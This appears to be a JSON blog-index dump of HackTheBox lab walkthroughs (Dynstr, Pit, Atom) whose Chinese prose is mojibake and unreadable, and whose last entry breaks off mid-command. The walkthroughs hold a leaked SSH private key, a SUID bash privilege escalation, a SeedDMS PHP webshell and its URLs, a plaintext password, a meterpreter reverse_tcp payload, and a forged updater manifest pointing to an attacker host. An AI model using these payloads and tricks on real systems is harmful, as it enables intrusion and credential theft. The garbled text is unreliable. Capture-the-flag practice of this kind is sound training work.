olEAAACBANIxP6oCTAg2yYiZ\\\\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\\\\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\\\\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\\\\n-----END OPENSSH PRIVATE KEY-----\\\\n\" > id\\_rsa\n```\n\nå³å¯è·å¾—æˆ‘ä»¬çš„å¯†é’¥ï¼Œé€šè¿‡ä¸Šé¢çš„æ–¹å¼å’±ä»¬è‡ªå·±è·å¾—ä¹Ÿå¯ä»¥\n\nè¿™é‡Œæ·»åŠ Aè®°å½•ä»¥åï¼Œå’±ä»¬å»å°è¯•sshç™»å½•\n\n![](Hackthebox-Dynstr/66790ea3-2073-406f-90ae-611b2a20fb44.png)\n\næˆåŠŸæ‹¿åˆ°bindmgrè´¦æˆ·æƒé™\n\n![](Hackthebox-Dynstr/4328976b-82ed-4cab-97d3-b8a79abd3c1e.png)\n\næˆåŠŸè·å¾—useræƒé™flag\n\n# **æƒé™æå‡**\n![](Hackthebox-Dynstr/f62272a8-baa1-4498-bcbc-ba8ed9dd7343.png)\n\nå’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™\n\nå‘ç°å¯ä»¥æ‰§è¡Œbindmgr.shæ–‡ä»¶ï¼Œå’±ä»¬å…ˆå»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Dynstr/23c17921-fbcc-4a7b-bb62-1a0c2bcc24e5.png)\n\nè¿™é‡Œå’±ä»¬æ£€æŸ¥ä¸€ä¸‹.versionæ–‡ä»¶å…µä½¿ç”¨é€šé…ç¬¦\\*å¤åˆ¶æ‰€æœ‰å†…å®¹\n\n```\nfind / -name \".version\" 2>/dev/null\n```\n\n![](Hackthebox-Dynstr/4c86a314-fd06-403f-9571-18c1b67bb91e.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ.versionåœ¨/etc/æ–‡ä»¶å¤¹ä¸­ï¼Œæ‰€æœ‰è¿™ä¸ªæ–‡ä»¶ä¼šåœ¨å“ªé‡Œè¿è¡Œ\n\n![](Hackthebox-Dynstr/14548e43-4105-48ea-a557-ffeb76742642.png)\n\nè¿™é‡Œæˆ‘ä»¬è¦åšçš„äº‹åˆ›å»º.versionæ–‡ä»¶å¹¶æ·»åŠ 42åˆ°å®ƒé‡Œé¢\n\n```\necho 42 > .version\n```\n\n![](Hackthebox-Dynstr/f7203b34-0c1e-4e6c-83a0-e324a3d100c1.png)\n\né¦–å…ˆæˆ‘ä»¬å¤åˆ¶/bin/bashåˆ°å½“å‰ç›®å½•å¹¶ä½¿å…¶æˆä¸ºSUIDäºŒè¿›åˆ¶æ–‡ä»¶\n\n```\ncp /bin/bash .\nchmod +s bash\nls -la\n```\n\nä¸‹é¢å›¾ç‰‡é”™äº†ï¼Œè¯·è§è°…\n\n![](Hackthebox-Dynstr/7ee0e662-0abb-4023-aa84-713aae4dc45b.png)\n\næˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸º--preserve=modeçš„æ–‡ä»¶æ¥åˆ©ç”¨å®ƒï¼ŒåŒæ—¶å¤åˆ¶å®ƒä¼šä¿ç•™è¿™ä¸ªç›®å½•ä¸­æ–‡ä»¶çš„å±æ€§ï¼Œå°±åƒbashæœ‰SUIDæ‰€ä»¥å®ƒä¼šä¿ç•™é‚£äº›å±æ€§å¹¶å°†å…¶å¤åˆ¶åˆ°/etc/bind/named.bindmgrä¸ºrootæƒé™\n\n```\necho > --preserve=mode\nls -la\n```\n\n![](Hackthebox-Dynstr/0554747e-2646-473c-bd7e-b2ee36d8ffdd.png)\n\nç°åœ¨åªéœ€è¦è¿è¡Œsudoè„šæœ¬\n\n```\nsudo /usr/local/bin/bindmgr.sh\n```\n\n![](Hackthebox-Dynstr/0989ba08-48f0-4edb-9ece-bf6c1af0581d.png)\n\næ‰§è¡Œ./bash -på³å¯ææƒ\n\n```\ncd /etc/bind/named.bindmgr\n./bash -p\n```\n\n![](Hackthebox-Dynstr/6f5bbe17-c37a-4042-be13-b218736777fc.png)\n\n![](Hackthebox-Dynstr/6bb0d841-fc29-420b-85c9-e37e4dca6aad.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"Pit - Hackthebox","url":"/2021/06/11/Hackthebox/Medium/Hackthebox-Pit/","content":"\n# Hackthebox - Pit\n**Hackthebox - Pit é¶åœºå®æˆ˜**\n\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-Pit/bbf059c6-783d-4365-81b4-94a4de3c072c.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-Pit/0bbbf1f9-d927-403b-aceb-ab6273424d52.png)\n\n**ä¿¡æ¯æœé›†**\n\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.241\n\n![](Hackthebox-Pit/7e61779b-6c26-4716-b97f-c5fdc080e79b.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶åœºå¼€å¯äº†22ã€80ã€9090ç«¯å£\n\nå¹¶ä¸”æœ‰ä¸€ä¸ªä¸€ä¸ªåŸŸådms-pit.htbï¼Œå’±ä»¬å°†å®ƒåŠ å…¥hostsé‡Œ\n\nvim /etc/hosts\n\n![](Hackthebox-Pit/ba406a30-1b3f-4c6e-aeb9-a585bb847377.png)\n\né¦–å…ˆæˆ‘ä»¬è®¿é—®ä¸€ä¸‹pit.htbçœ‹çœ‹\n\n![](Hackthebox-Pit/d281e399-5528-4d7c-adcb-94ac8154adae.png)\n\nå°±æ˜¯ä¸€ä¸ªNginxçš„åˆå§‹é¡µé¢ï¼Œæ²¡ä»€ä¹ˆçœ‹çš„æ„ä¹‰\n\næ¥ç€å’±ä»¬çœ‹çœ‹dms-pit.htb\n\n![](Hackthebox-Pit/ba375abe-7109-4ebc-8e48-cf8408dd013a.png)\n\nå•Šè¿™ï¼Œç›´æ¥403ï¼Œä¹Ÿä¸ç”¨çœ‹ï¼Œé‚£å’±ä»¬å»çœ‹çœ‹9090ç«¯å£å§\n\n![](Hackthebox-Pit/fad87eb2-1064-4599-ad8c-12592f8afec0.png)\n\nå¥½åƒæ˜¯ä¸€ä¸ªCentOSçš„åœ¨çº¿ç®¡ç†é¡µé¢ï¼Œä½†æ˜¯å’±ä»¬ä¹Ÿæ²¡å¯†ç å•Š\n\nç»è¿‡å¤§é‡çš„ç›®å½•æœé›†ä»¥åï¼Œæˆ‘å‘ç°è¿˜æ˜¯æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ²¡åŠæ³•äº†å‘€ï¼Œåªèƒ½å»å®˜æ–¹è®ºå›çœ‹çœ‹å¤§ä½¬ä»¬çš„æç¤ºäº†\n\n![](Hackthebox-Pit/699127a3-bb17-4b4b-a1a6-2ad7d1b1a5ec.png)\n\nå¤§ä½¬è¯´åœ¨å®˜æ–¹æ¨ç‰¹ä¼šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„æç¤ºï¼Œé‚£å’±ä»¬å»æ‰¾æ‰¾çœ‹å§\n\n![](Hackthebox-Pit/2a3dfe26-2563-423f-948f-ef8f934b89f7.png)\n\nå®˜æ–¹æç¤ºåœ¨WALK\n\næ‰€ä»¥å’±ä»¬æ‰«æä¸€ä¸‹è¿™å°æœºå™¨çš„snmpå¼€æ”¾ç«¯å£å§\n\nnmap -sU 10.10.10.241\n\n![](Hackthebox-Pit/317c333d-ff16-476c-95e4-134ded5c27fc.png)\n\næˆ‘ä»¬å‘ç°äº†ä»–çš„SNMPç‰ˆæœ¬\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ¥è¿›è¡Œæ‰«æ\n\n[https://github.com/dheiland-r7/snmp](https://github.com/dheiland-r7/snmp)\n\n![](Hackthebox-Pit/78f6ba4d-d324-4893-9229-551e18c301f6.png)\n\n![](Hackthebox-Pit/6b5a9014-98a4-4a09-b39b-a614001b6877.png)\n\nè¿™é‡Œæˆ‘ä»¬æˆåŠŸè·å¾—äº†å†…æ ¸ç‰ˆæœ¬ã€ç›®å½•ã€ç”¨æˆ·å\n\nç›®å‰ä¿¡æ¯è·å–æœé›†åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬è¿˜æ˜¯æ²¡æœ‰è¿›ä¸€æ­¥çš„åŠæ³•ï¼Œå’‹åŠå‘¢\n\nåœ¨æˆ‘ç¿»æ‰¾10.10.10.241.snmpæ–‡ä»¶çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€è¡Œ\n\n![](Hackthebox-Pit/ef83b24a-64c2-455d-9c45-024ca7d2dc11.png)\n\nè¿™æ˜¾ç„¶æ˜¯ä¸€ä¸ªç›®å½•å•Šï¼Œæ ¹æ®ç›®å½•æ¥æ„é€ ï¼ŒURLåº”è¯¥ä¸ºhttp://localhost/seeddms51x/seeddms/ï¼Œè®©å’±ä»¬å»å°è¯•ä¸€ä¸‹\n\n![](Hackthebox-Pit/9a5a1de5-4e43-4344-8f4d-b25434fe96af.png)\n\nç¡®è®¤äº†URLä¸ºhttp://dms-pit.htb/seeddms51x/seeddms/\n\nç„¶åéœ€è¦è´¦å·å¯†ç ï¼Œé‚£è¿˜å¾—å»æ‰¾æ‰¾snmpæ–‡ä»¶\n\n![](Hackthebox-Pit/858b9c44-4146-4cd4-a194-fd204987c23b.png)\n\nå‘ç°äº†ä¸¤ä¸ªè´¦æˆ·\n\nrootå’Œmichelleï¼Œå’±ä»¬å»å°è¯•ä¸€ä¸‹\n\næµ‹è¯•åå‘ç°è´¦å·å¯†ç ä¸ºmichelleï¼Œæ—¢æ˜¯è´¦å·ï¼Œä¹Ÿæ˜¯å¯†ç \n\n![](Hackthebox-Pit/4534ed96-341d-46b1-b781-110266905fb7.png)\n\n**æ¼æ´åˆ©ç”¨**\n\nè¿™é‡Œå’±ä»¬å¯ä»¥çœ‹åˆ°æ‰€ä½¿ç”¨çš„æ˜¯SeedDMSï¼Œç„¶åå»æœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´\n\n![](Hackthebox-Pit/e85629a1-7c98-46d4-a0e2-a454c699c91d.png)\n\nå…¶ä¸­ç¬¬å››ä¸ªæ˜¯æˆ‘ä»¬è¦çš„æ¼æ´ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹\n\ncat /usr/share/exploitdb/exploits/php/webapps/47022.txt\n\n![](Hackthebox-Pit/c6ce8fa2-ee2f-4a79-877c-0052329f129e.png)\n\nCVE-2019-12744\n\nè¿™ä¸ªæ¼æ´çš„æ„æ€å‘¢æ˜¯\n\n1. ç™»å½•åº”ç”¨ç¨‹åºå¹¶åœ¨ä»»ä½•æ–‡ä»¶å¤¹ä¸‹æ·»åŠ æ–‡æ¡£\n2. é€‰æ‹©æ–‡ä»¶ä½œä¸ºç®€å•çš„phpåé—¨æ–‡ä»¶æˆ–ä»»ä½•åé—¨webshelléƒ½å¯ä»¥ä½¿ç”¨\n3. ä¸Šä¼ åæ£€æŸ¥ä¸æ–‡æ¡£å¯¹åº”çš„æ–‡æ¡£ID\n4. è®¿é—®example.com/data/1048576/\"document\\_id\"/1.php?cmd=cat+/etc/passwdä»¥åœ¨æµè§ˆå™¨ä¸­åˆ©ç”¨\n\nç¬¬ä¸€æ­¥ï¼Œåœ¨æœ¬åœ°ä»»æ„åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹\n\n\"; \\$cmd = (\\$\\_REQUEST\\['cmd'\\]); system(\\$cmd); echo \"\"; die; } ?>\n\nç¬¬äºŒæ­¥ï¼Œç™»å½•åå°åï¼Œä¾æ¬¡ç‚¹å‡» Docs -> Users -> Michelle -> Add document\n\n![](Hackthebox-Pit/c5ed362e-3130-49fa-936b-fe3df954e5de.png)\n\nç¬¬ä¸‰æ­¥ï¼Œä¸Šä¼ phpé©¬\n\nç¬¬å››æ­¥ï¼Œå¤åˆ¶phpé©¬çš„è¿æ¥\n\n[http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1](http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=44&showtree=1)\n\nä»ä¸Šæˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ–‡æ¡£IDä¸º44ï¼Œç„¶åæˆ‘ä»¬æ„é€ poc\n\n[http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd](http://dms-pit.htb/data/1048576/44/1.php?cmd=cat+/etc/passwd)\n\n[http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd](http://dms-pit.htb/seeddms51x/data/1048576/44/1.php?cmd=cat+/etc/passwd)\n\n![](Hackthebox-Pit/bc3c044d-ad4b-40bd-8029-0028afc9aa8e.png)\n\n![](Hackthebox-Pit/b95de7b7-1f9e-4ded-a7ae-e9dc6fee9cbe.png)\n\næˆåŠŸåˆ©ç”¨è¯¥æ¼æ´\n\nè¯¥shellä¼šäº”åˆ†é’Ÿåˆ é™¤ä¸€æ¬¡ï¼Œå¦‚æœè¢«åˆ é™¤äº†å¤§å®¶é‡æ–°ä¸Šä¼ ä¸€æ¬¡å³å¯\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹conf/settings.xmlæ–‡ä»¶\n\n[http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml](http://dms-pit.htb/seeddms51x/data/1048576/45/1.php?cmd=cat%20../../../conf/settings.xml)\n\næ‰“å¼€åä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªç©ºç™½é¡µé¢ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹æºæ–‡ä»¶\n\n![](Hackthebox-Pit/65ae73c8-492c-4cb1-b63b-b6b4b2099125.png)\n\næˆåŠŸæ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç \n\nseeddms\n\nied^ieY6xoquu\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ•°æ®åº“è´¦å·å¯†ç å¹¶æ²¡æœ‰åœ¨ç³»ç»Ÿè´¦æˆ·é‡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•ç›´æ¥åˆ©ç”¨sshè¿›è¡Œç™»å½•ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿçªç„¶æƒ³åˆ°ï¼Œå’±ä»¬9090ç«¯å£ä¸æ˜¯éœ€è¦ä¸€ä¸ªè´¦å·å¯†ç å˜›ï¼Œå’±ä»¬å»è¯•è¯•\n\nç»è¿‡æµ‹è¯•ï¼Œè´¦å·æ˜¯michelleï¼Œå¯†ç æ˜¯ied^ieY6xoquu\n\nOKï¼Œå’±ä»¬æˆåŠŸç™»å½•\n\n![](Hackthebox-Pit/d8efd785-fd5c-400d-95a0-d9cfb6585cf8.png)\n\nçªç„¶ï¼Œæˆ‘çš„çœ¼å…‰å°±è¢«â€œç»ˆç«¯â€ä¸¤ä¸ªå­—å¸å¼•äº†\n\n![](Hackthebox-Pit/4715297c-072d-4f4e-b065-6ca612721fcf.png)\n\nå’±ä»¬è¿™å°±ç›´æ¥ä»nginxæƒé™ï¼Œæ‹¿åˆ°äº†ä¸€ä¸ªusersçš„æƒé™\n\n![](Hackthebox-Pit/593bfb4d-baf6-4b62-b9f6-4921bbadb41a.png)\n\næˆåŠŸè·å¾—useræƒé™çš„flag\n\n**æƒé™æå‡**\n\nå’±ä»¬ç»§ç»­æŠŠç›®å…‰æ”¾åœ¨snmpæ–‡ä»¶ä¸Š\n\n![](Hackthebox-Pit/a92b1b53-6a8d-481b-bc9a-12770d201ee0.png)\n\nåœ¨ç»è¿‡ç¡®è®¤åï¼Œæˆ‘æŠŠçœ¼å…‰æ”¾åœ¨äº†è¿™ä¸€è¡Œä¸Šï¼Œå’±ä»¬å»çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶\n\n![](Hackthebox-Pit/cb0477e3-73b3-4b1b-9d72-907011cbf567.png)\n\nè¿™æ˜¯ä¸€ä¸ªbashè„šæœ¬ï¼Œæ„Ÿè§‰å¯èƒ½æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸Š\n\nä¸Šé¢çš„è„šæœ¬æ˜¾ç¤ºäº†ä»å¦ä¸€ä¸ªä½ç½®è¿è¡Œäº†è„šæœ¬ï¼Œå’±ä»¬ä¸€æ­¥æ­¥è·Ÿè¿‡å»çœ‹çœ‹\n\nls -la /usr/local/monitoring/\n\n![](Hackthebox-Pit/92b6d609-78b9-4b88-93b7-0ec40dafbb0d.png)\n\næ— æ³•åˆ—å‡ºï¼Œåº”è¯¥æ˜¯æƒé™ä¸è¶³ï¼Œå’±ä»¬çœ‹çœ‹è¯¥ç›®å½•çš„æƒé™\n\n![](Hackthebox-Pit/e5da7a3f-d24e-4e04-b068-7e31b9c25da0.png)\n\nå’±ä»¬å¯¹è¿™ä¸ªç›®å½•æœ‰è¯»ã€å†™ã€æ‰§è¡Œä»¥åŠ+æƒé™\n\nä¹Ÿå°±æ˜¯æœ‰æƒé™æ‰©å±•ï¼Œè®©å’±ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Pit/5e0579f5-29b7-42eb-affd-f32061009df2.png)\n\nä»ä¸Šé¢å¯ä»¥è§£è¯»å‡ºï¼Œè¯¥ç›®å½•å±äºrootç”¨æˆ·ï¼Œå…¶ä»–ç”¨æˆ·æœ‰æ‰€æœ‰æƒé™ï¼Œä½†michelleç”¨æˆ·åªæœ‰å†™å…¥å’Œæ‰§è¡Œæƒé™\n\nè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ¥æ‰¾å‡ºæƒ³è¦çš„ä¸œè¥¿\n\n![](Hackthebox-Pit/5ad916d9-2535-4279-b9b4-f66ef3778f10.png)\n\næˆåŠŸäº†\n\n![](Hackthebox-Pit/8052248d-6d55-4dbc-8136-559f3cff1595.png)\n\nåˆ›å»ºä¸€ä¸ªshæ–‡ä»¶ï¼Œå¡«å…¥å…¬é’¥ï¼Œç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨\n\næœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\npython3 -m http.server 80\n\nåœ¨ç»ˆç«¯ä¸­ä½¿ç”¨curlè¿›è¡Œä¸‹è½½\n\ncurl [http://10.10.14.236/check.sh -o check.sh](http://10.10.14.236/check.sh%20-o%20check.sh)\n\n![](Hackthebox-Pit/9a1adb27-63e3-44a8-9137-a7d5e9d5fbab.png)\n\nç„¶åæ‹·è´åˆ°/usr/local/monitoring/ç›®å½•ä¸‹\n\ncp check.sh /usr/local/monitoring/\n\n![](Hackthebox-Pit/88bd50ea-4d19-46eb-9ea8-f0b00a45dee4.png)\n\nrootè´¦æˆ·æ­£è¿è¡Œç€ä¸€ä¸ªè„šæœ¬ï¼Œç›‘æ§ç›®å½•çš„å†…å®¹ç„¶ååœ¨äº”åˆ†é’Ÿååˆ é™¤\n\næŠŠæˆ‘ä»¬çš„shellæ”¾è¿›å»åï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœ¬åœ°è¿è¡ŒSNMPwalkåº”ç”¨ç¨‹åºæ‰§è¡Œå®ƒ\n\nsnmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects\n\n![](Hackthebox-Pit/4b7d382c-72eb-4ef1-accf-ab27732f8053.png)\n\nç„¶åå’±ä»¬ä½¿ç”¨sshè¿›è¡Œè¿æ¥\n\nssh -i lucifiel [root@10.10.10.241](mailto:root@10.10.10.241)\n\nå¦‚æœè¿™é‡Œæç¤ºroot@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).\n\nåˆ™æ˜¯snmpwalkçš„é—®é¢˜ï¼Œè¾“å…¥sudo apt-get install snmp-mibs-downloaderè¿›è¡Œé‡æ–°å®‰è£…å³å¯\n\n![](Hackthebox-Pit/45b44ec0-3a6b-4ec3-a44e-d567c309ca28.png)\n\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","tags":["Hackthebox"]},{"title":"Atom - Hackthebox","url":"/2021/06/05/Hackthebox/Medium/Hackthebox-Atom/","content":"\n# Hackthebox - Atom\n# **é¶åœºä¿¡æ¯**\n![](Hackthebox-Atom/3aeafb47-8fc4-46b4-be86-6a0a49062efd.png)\n\n# **é¶åœºç±»å‹**\n![](Hackthebox-Atom/b32c86c2-4bd0-4a89-9cdc-9e4174fe61f1.png)\n\n# **ä¿¡æ¯æœé›†**\n## Nmap\né¦–å…ˆä½¿ç”¨NMAPè¿›è¡Œç«¯å£æ‰«æ\n\n![](Hackthebox-Atom/dd926d4e-9a1b-4f19-adb8-f97fde301460.png)\n\n## Smb\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°é¶åœºå¼€å¯äº†80 135 443 445ç«¯å£ï¼Œä»¥åŠæœ‰SMBæœåŠ¡\n\nä¸”SMBæœåŠ¡å¯ä»¥ç”±guestæƒé™ç™»å½•ï¼Œé‚£å’±ä»¬å°±å…ˆçœ‹çœ‹smbæœ‰å•¥å§\n\n```cpp\nsmbclient -L ////10.10.10.237////\n```\nå¯†ç ä¸ºç©ºå³å¯\n\n![](Hackthebox-Atom/978fb275-7126-4774-bfa9-b59312805be3.png)\n\nçœ‹çœ‹æˆ‘ä»¬å¯ä»¥åŒ¿åé˜…è¯»çš„å†…å®¹æœ‰å“ªäº›\n\n```cpp\nsmbmap -u 'anonymous' -p '' -H 10.10.10.237\n```\n![](Hackthebox-Atom/54d7c1d0-7ef0-47f4-947a-f9f34e0b64fd.png)\n\nçœ‹æ¥å¯ä»¥åŒ¿åè¯»å†™Software\\_Updatesç›®å½•\n\n```cpp\nsmbclient [\\\\\\\\10.10.10.237\\\\Software_Updates](file:///////10.10.10.237//Software_Updates)\n```\nç™»å½• ç„¶åä½¿ç”¨diræŸ¥çœ‹\n\n![](Hackthebox-Atom/ca92100a-9f73-469c-8b4f-66d24d1ed2ed.png)\n\nçœ‹æ¥UAT\\_Testing\\_Procedures.pdfæ–‡æ¡£å¯ä»¥è¢«ä¸‹è½½ï¼Œå’±ä»¬ä½¿ç”¨getè¿›è¡Œä¸‹è½½\n\n![](Hackthebox-Atom/eba4868a-9dad-4612-83f0-263bb5c90f12.png)\n\n![](Hackthebox-Atom/79287bd2-cac8-4f49-9338-b16c1345428d.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ–‡æ¡£æè¿°äº†ä¸€ä¸ªåä¸ºHeedçš„ç¬”è®°åº”ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŸºäºå®¢æˆ·ç«¯çš„åº”ç”¨ç¨‹åºï¼Œæ²¡æœ‰ä¸æœåŠ¡å™¨äº¤äº’ã€‚ä½†æ˜¯å®ƒç¡®å®é€šè¿‡å®¢æˆ·ç«¯æ–‡ä»¶å¤¹è¿›è¡Œäº†æ›´æ–°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹äº†ï¼Œåˆ†åˆ«æ˜¯client1ã€client2ã€client3ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è®¿é—®80ç«¯å£\n\n![](Hackthebox-Atom/5e7e6b40-955a-4574-9e8a-2e8b8a062987.png)\n\n![](Hackthebox-Atom/0d945013-c4bb-49a0-b793-245e9f284e9e.png)\n\næˆ‘ä»¬å¾€ä¸‹ç¿»æ»šï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸‹è½½æŒ‰é’®å’Œä¸€ä¸ªé‚®ç®±MrR3boot@atom.htb\n\næ—¢ç„¶åŸŸåéƒ½ç»™äº†ï¼Œé‚£è¿˜æ˜¯è€è§„çŸ©ï¼Œæ·»åŠ hostså§\n\n```cpp\nvim /etc/hosts\n```\n![](Hackthebox-Atom/614c8d33-4173-47c8-a05b-ced63892f4f8.png)\n\n## Gobuster\næ—¢ç„¶éƒ½æ·»åŠ äº†ï¼Œé‚£ç›®å½•çˆ†ç ´å’Œå­åŸŸåçˆ†ç ´å°±ä¸èƒ½å°‘äº†ï¼Œçˆ†ç ´å§\n\ngobusterçˆ†ç ´ç›®å½•\n\n```cpp\ngobuster dir -u \"http://10.10.10.237/\" -x php,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\n```\n![](Hackthebox-Atom/02f0988b-a3f0-487b-b4b5-85e6ca5ad2f5.png)\n\ngobusterçˆ†ç ´DNS\n\n```cpp\ngobuster dns -d 'atom.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n```\n![](Hackthebox-Atom/3e914921-9098-4971-9530-038745e49625.png)\n\nç®€å•çˆ†ç ´äº†ä¸€ä¸‹ï¼Œå¥½åƒéƒ½æ²¡å•¥æœ‰ç”¨çš„ä¸œè¥¿ï¼Œé‚£å’±ä»¬åªèƒ½å»ä¸‹è½½äº†\n\n![](Hackthebox-Atom/bee2234d-5d40-4422-b748-83dc6bfe7758.png)\n\n![](Hackthebox-Atom/72b012ad-49ae-4978-8d51-ffbffd41ce08.png)\n\nä¸‹è½½ä¸‹æ¥åæ˜¯ä¸€ä¸ªexeç¨‹åºï¼Œè¿™å°±ä¸å¾—ä¸åˆ‡æ¢ä¸€å°windowsçš„æœºå™¨å‡ºæ¥äº†\n\n![](Hackthebox-Atom/fbc8b7f2-2ab1-4bd8-86fe-be406a76db43.png)\n\nå®‰è£…å¥½åæ˜¯é…±å©¶å„¿çš„\n\n![](Hackthebox-Atom/935136a5-9fcc-4ff5-aecd-f0c5a057538d.png)\n\n![](Hackthebox-Atom/0b0cdabc-3dd8-4fe7-9710-c21c76ba44fe.png)\n\nè¿™å‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªç”µå­åº”ç”¨ç¨‹åº\n\n![](Hackthebox-Atom/ed184c95-5181-47a7-951d-b65e26dcc45b.png)\n\né€šè¿‡Googlesæœç´¢rceç¨‹åº\n\n![](Hackthebox-Atom/2a62ebef-89ac-46c2-a711-95141cc37718.png)\n\n> [https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html)\n\n![](Hackthebox-Atom/8c6b16d3-bc66-41ea-938a-d35f473483a2.png)\n\nJuliano Rizzo è¿™é‡Œæåˆ°äº†æ˜¯ç”±è¿™ä½å¤§ä½¬å‘ç°çš„æ¼æ´ï¼Œæ„Ÿè°¢\n\n![](Hackthebox-Atom/9c8742ef-a0cb-453e-9809-185ae8092dda.png)\n\n![](Hackthebox-Atom/a52b4aef-6929-454c-9a29-f842ad7d9bb8.png)\n\nè¿™é‡Œè¯´å®ƒå°†ä»latest.ymlè¿›è¡Œæ›´æ–°\n\n# **æ¼æ´åˆ©ç”¨**\né¦–å…ˆæˆ‘ä»¬ç”Ÿæˆå¸¦æœ‰å•å¼•å·çš„æœ‰æ•ˆè´Ÿè½½\n\n```cpp\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.184 LPORT=4444 -f exe > \"u'payload.exe\"\n```\n![](Hackthebox-Atom/6157165b-d499-4087-bc6f-a16bbfed85d1.png)\n\nç°åœ¨æˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ª sha512 sum hash å¹¶å°†å…¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åè¿›ä¸€æ­¥è½¬æ¢ä¸ºbase64\n\n```cpp\nshasum -a 512 \"u'payload.exe\" | cut -d \" \" -f1 | xxd -r -p | base64\n```\n![](Hackthebox-Atom/d7215416-bdc3-43b9-88f0-a3bd339e9d1c.png)\n\n```cpp\nkPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==\n```\nåˆ›å»ºlatest.ymlæ–‡ä»¶\n\n```cpp\nversion: 1.0.1\npath: http://10.10.14.184/u'payload.exe\nsha512: kPA7kwD6QtUcXqDkwnQacg7ZUWGSBiz4oTaWQuxceC7t8SRYcq5T6CBmujUbrHhMVKLJ+RftvSkmpXGFJ1cCMg==\n```\n![](Hackthebox-Atom/eef83432-f347-48b4-8634-50056cb1dbd9.png)\n\nä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\n```cpp\npython3 -m http.server 80\n```\n![](Hackthebox-Atom/61216e59-103e-4f74-8ca4-562b5b22a224.png)\n\næ›¿æ¢æ‰smbå…±äº«ä¸­çš„ymlæ–‡ä»¶\n\n![](Hackthebox-Atom/15bcce74-cf7b-4fbb-9ab0-8932fa5363aa.png)\n\n![](Hackthebox-Atom/4e36ec59-bb2c-4354-9cdc-c2818cf78045.png)\n\n![](Hackthebox-Atom/e1caef27-db98-4aac-a3d1-9a46d2ef2a46.png)\n\nä¸‰ä¸ªæ–‡ä»¶å¤¹éƒ½è¦æ›¿æ¢\n\n```cpp\nuse exploit/multi/handler\nset PAYLOAD 